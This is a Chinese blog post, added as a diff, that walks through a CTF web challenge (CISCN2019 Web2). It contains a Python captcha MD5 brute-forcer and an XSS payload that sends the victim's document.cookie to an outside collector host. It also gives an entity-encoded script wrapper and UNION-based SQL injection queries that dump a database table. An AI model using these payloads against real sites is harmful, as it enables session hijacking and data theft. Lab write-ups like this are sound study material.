@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[CISCN2019 华东北赛区]Web2 - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[CISCN2019 华东北赛区]Web2
+xss的cookie盗取
+联合注入
+
+登录发现是一个论坛页面，注册一个账号，然后发帖，刚开始以为是二次注入，但是发现单引号什么的都没过滤，也没有什么回显
+,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[CISCN2019 华东北赛区]Web2</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[CISCN2019 华东北赛区]Web2</h1>
+        <div class="stuff">
+            <span>七月 14, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><ul>
+<li>xss的cookie盗取</li>
+<li>联合注入</li>
+</ul>
+<p>登录发现是一个论坛页面，注册一个账号，然后发帖，刚开始以为是二次注入，但是发现单引号什么的都没过滤，也没有什么回显</p>
+<p>然后发现，要经过审核之后，才能够发表</p>
+<p>我们来到审核页面，要输入审核的url和验证码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">md5_val</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">999999</span>, <span class="number">100000000</span>):</span><br><span class="line">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>]==md5_val:</span><br><span class="line">            <span class="keyword">return</span> str(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">print</span> func(<span class="string">&#x27;fe1721&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先看验证码的爆破</p>
+<p>只要符合验证码md5值前六位和他给出的值相等即可，所以我们进行爆破</p>
+<p>审核就是基于xss的cookie盗取，在题目介绍的页面也给了xss的网址，所以我们先创建一个xss项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;(new Image()).src&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;qgyhAd&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>生成了这段代码，我们进行稍加修改，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;windows.location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;qgyhAd&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>然后进行url实体编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval&amp;<span class="comment">#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>output就是上面经过实体编码后的内容</p>
+<p>然后在url输入<a target="_blank" rel="noopener" href="http://web.node3.buuoj.cn/post/966f1e8300fc979343fb7300cc0c74fd.html">http://web.node3.buuoj.cn/post/966f1e8300fc979343fb7300cc0c74fd.html</a></p>
+<p>爆破验证码</p>
+<p>然后由于管理员带着cookie访问了这个网址，所以成功被我们盗窃，来到admin.php的页面，修改cookie</p>
+<p>发现是一个查询框</p>
+<p>然后利用基础的联合查询找到flag</p>
+<p>-1 union select 1,2,3#<br>-1 union select 1,database(),3#                  ciscn</p>
+<p>-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’ciscn’#            flag,users</p>
+<p>-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’ciscn’ and table_name=’flag’#  flagg</p>
+<p>-1 union select 1,flagg,3 from flag#</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
